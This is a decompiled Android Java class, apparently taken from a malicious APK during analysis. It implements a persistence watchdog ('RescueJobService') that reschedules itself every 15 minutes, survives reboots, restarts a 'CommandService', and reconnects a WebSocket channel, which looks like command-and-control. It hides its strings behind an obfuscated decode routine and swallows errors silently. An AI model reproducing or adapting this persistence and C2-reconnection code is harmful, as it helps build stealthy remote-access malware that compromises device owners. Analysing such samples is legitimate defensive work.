package com.base.template.services;

import android.app.job.JobInfo;
import android.app.job.JobParameters;
import android.app.job.JobScheduler;
import android.app.job.JobService;
import android.content.ComponentName;
import android.content.Context;
import com.base.template.network.WsPersistManager;
import okhttp3.Headers;
import p000.C0000;

/* JADX INFO: loaded from: /Users/xv/pin2/max-gate-apk/output/stage4/classes.dex */
public final class RescueJobService extends JobService {
    private static final int JOB_ID = 23566;
    private static final String TAG = C0000.decode(new byte[]{54, 7, 17, 83, 71, 86, 126, 92, 0}, "dbb02343bc32f95f", 0.0f);
    public static final Companion Companion = new Companion();

    public final class Companion {
        public static void schedule(Context context) {
            try {
                Object systemService = context.getSystemService(C0000.decode(new byte[]{8, 87, 3, 18, 2, 11, 7, 92, 20, 13, 4, 17}, "b8aaac"));
                JobScheduler jobScheduler = systemService instanceof JobScheduler ? (JobScheduler) systemService : null;
                if (jobScheduler != null && jobScheduler.getPendingJob(RescueJobService.JOB_ID) == null) {
                    jobScheduler.schedule(new JobInfo.Builder(RescueJobService.JOB_ID, new ComponentName(context, (Class<?>) RescueJobService.class)).setPeriodic(900000L, 300000L).setPersisted(true).setRequiredNetworkType(1).build());
                }
            } catch (Exception e) {
                e.getMessage();
            }
        }
    }

    @Override // android.app.job.JobService
    public boolean onStartJob(JobParameters jobParameters) {
        try {
            if (CommandService.instance == null) {
                Headers.Companion.safeStartService(getApplicationContext(), C0000.decode(new byte[]{97, 118, 48, 118, 102, 124, 109, 44, 123, 122}, "33c5392f48af"));
            }
            Object obj = WsPersistManager.lock;
            if (WsPersistManager.isConnected) {
                return false;
            }
            WsPersistManager.connect(getApplicationContext());
            return false;
        } catch (Exception e) {
            e.getMessage();
            return false;
        }
    }

    @Override // android.app.job.JobService
    public boolean onStopJob(JobParameters jobParameters) {
        return true;
    }
}
